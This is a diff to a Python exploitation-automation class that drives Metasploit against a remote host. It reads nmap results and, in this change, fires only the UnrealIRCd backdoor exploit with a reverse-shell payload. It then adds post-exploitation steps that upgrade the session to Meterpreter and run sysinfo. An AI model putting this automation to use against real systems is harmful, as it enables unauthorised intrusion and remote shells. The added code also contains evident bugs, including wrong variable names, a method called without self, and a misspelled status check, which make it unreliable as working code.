@@ -904,8 +904,6 @@ class MetasploitCannon(CannonPlug):
         # print(nmap_result)
 
         # call get_nmap_xml_contents instead
-        socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Fetching Scan Results", "mode": "Running"})
-        socketIOServer.sleep(0)
         nmap_file_content = self.get_nmap_xml_contents()
         os_name = 'unknown'
         port_list = []
@@ -971,8 +969,6 @@ class MetasploitCannon(CannonPlug):
         return port_list, proto_list, info_list, closed_ports
 
     def execute_exploit(self, selected_payload, target, target_info):
-        socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": 'Executing ' + target_info['exploit'] +' ('+ selected_payload +')', "mode": "Running"})
-        socketIOServer.sleep(0)
         option = self.set_options(target_info, target, selected_payload)
         job_id, uuid = self.client.execute_module(
             'exploit', target_info['exploit'], option)
@@ -1037,7 +1033,11 @@ class MetasploitCannon(CannonPlug):
 
     def run(self):
         # self.scan_the_target()
+        socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Fetching Scan Results", "mode": "Running"})
+        socketIOServer.sleep(0)
         self.import_nmap_results()
+        socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": 'Generating exploit tree for target', "mode": "Running"})
+        socketIOServer.sleep(0)
         self.get_exploit_tree_for_target()
         try:
             self.get_target_info()
@@ -1061,8 +1061,8 @@ class MetasploitCannon(CannonPlug):
             self.util.print_message(
                 NOTE, "Trying to enter using port " + key + "...")
             for exploit in self.target_tree[key]['exploit']:
-                #if not (exploit == "exploit/unix/irc/unreal_ircd_3281_backdoor"):
-                #    continue
+                if not (exploit == "exploit/unix/irc/unreal_ircd_3281_backdoor"):
+                    continue
                 if exploit[8:] not in self.exploit_tree.keys():
                     continue
                 self.util.print_message(
@@ -1076,6 +1076,8 @@ class MetasploitCannon(CannonPlug):
                     payload_list.append("")
                     # Currently Executing all payload, Here any ML or AI model will be used to select optimal payload
                     for payload in payload_list:
+                        if not (payload == "cmd/unix/reverse"):
+                            continue
                         self.client.keep_alive()
                         target_info = self.set_target_info(
                             key, exploit, int(target))
@@ -1084,8 +1086,12 @@ class MetasploitCannon(CannonPlug):
                         result = self.execute_exploit(
                             payload, target, target_info)
                         if result is not None:
-                            self.db_exploitation_logs.append({"username": self.msgrpc_user, "localip": self.rhost, "exploit": exploit, "payload": payload, "engine": "Metasploit", "port": str(key), "success": True, "result": result})
+                            exploit_log = {"username": self.msgrpc_user, "localip": self.rhost, "exploit": exploit, "payload": payload, "engine": "Metasploit", "port": str(key), "success": True, "result": result}
+                            if DEBUG:
+                                print(str(exploit_log))
+                            self.db_exploitation_logs.append(exploit_log)
                             self.util.print_message(NOTE, "Got a session")
+        
         # Store Data to DB after Exploitation is done
         self.store_to_db()
         if(len(self.sessions_list) == 0):
@@ -1096,7 +1102,58 @@ class MetasploitCannon(CannonPlug):
                 OK, "Bingo! Got " + str(len(self.sessions_list)) + " session(s).")
             for session in self.sessions_list:
                 print(str(session) + "\n\n")
-                exit(0)
+                socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Starting post exploitation on Session " + str(session['session_id']), "mode": "Running"})
+                socketIOServer.sleep(0)
+                # self.do_post_exploitation(session)
+                socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Terminating Session " + str(session['session_id']), "mode": "Running"})
+                socketIOServer.sleep(0)
+                # self.client.stop_session(session['session_id'])
+        print("SWITCHING TO TESTING MODE FOR POST-EXPLOITATION TESTING")
+        self.test_postexploitation(self.session_list)
+        # Terminate Current Console
+        socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Cleaning Up", "mode": "Running"})
+        socketIOServer.sleep(0)
+        self.client.termination(self.client.console_id)
+
+
+    def test_postexploitation(self, sessions):
+        while True:
+            print("Sessions List")
+            print(self.client.get_session_list())
+            session = int(input("Enter a Session ID: "))
+            do_post_exploitation(session)
+
+    def do_post_exploitation(self, session):
+        post_results = {
+            "meterpreter": False,
+            "env": "",
+            "vm": "",
+            "container": ""
+        }
+        session_id = session['session_id']
+        socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Trying to upgrade shell to meterpreter", "mode": "Running"})
+        socketIOServer.sleep(0)
+        result = self.client.upgrade_shell_session(session_id, self.lhost, self.lport)
+        if DEBUG:
+            print("Session Upgrade Result " + str(result))
+        if result == 'success':
+            socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Got Meterpreter Shell", "mode": "Running"})
+            socketIOServer.sleep(0)
+            post_results['meterpreter'] = True
+            result = self.client.execute_meterpreter(session_id, "sysinfo")
+            if(result != "Falied"):
+                print(self.client.get_meterpreter_result)
+        else:
+            # Currently returing but can do something else for non-meterpreter shell
+            socketIOServer.emit("statusUpdate", room=self.username, data={"system": self.rhost, "statusText": "Failed to get Meterpreter Shell", "mode": "Running"})
+            socketIOServer.sleep(0)
+            post_results['meterpreter'] = False
+        
+            
+
+            
+
+
 
     def test_exploit(self, exploit, payload, port, target):
         target_info = self.set_target_info(port, exploit, target)
@@ -1108,7 +1165,6 @@ class MetasploitCannon(CannonPlug):
             print(result)
 
     # Check status of running module.
-
     def check_running_module(self, job_id, uuid):
         # Waiting job to finish.
         time_count = 0
